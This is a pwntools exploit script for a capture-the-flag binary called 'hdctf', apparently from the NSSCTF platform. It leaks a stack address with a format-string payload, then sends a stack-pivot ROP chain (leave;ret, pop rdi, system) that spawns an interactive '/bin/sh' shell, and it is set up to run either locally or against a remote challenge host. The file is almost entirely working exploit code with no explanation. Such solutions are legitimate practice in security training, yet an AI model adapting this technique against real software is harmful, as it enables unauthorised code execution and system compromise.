#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 1
os_level = 64
binary_name = 'hdctf'
remote_addr, port = 'node4.anna.nssctf.cn:28810'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    system = elf.plt['system']
    payload = b'%16$p'
    sla(b'name: \n',payload)
    ru(b'hello,')
    stack = int(rl().strip(b'\n'),16) - 0x60
    ru(b'!\n')
    show('stack--> '+ hex(stack))
    leave_ret = 0x4007f2
    prdi = 0x4008d3
    ret = 0x4005b9
    addr = stack + 0x28
    gdb.attach(p)
    pause()
    payload = p64(0xdeadbeaf) + p64(prdi) + p64(addr) + p64(ret) +p64(system) + str.encode('/bin/sh\x00')
    payload = payload.ljust(0x50, b'\x00') + p64(stack) + p64(leave_ret)
    sd(payload)
    p.interactive()
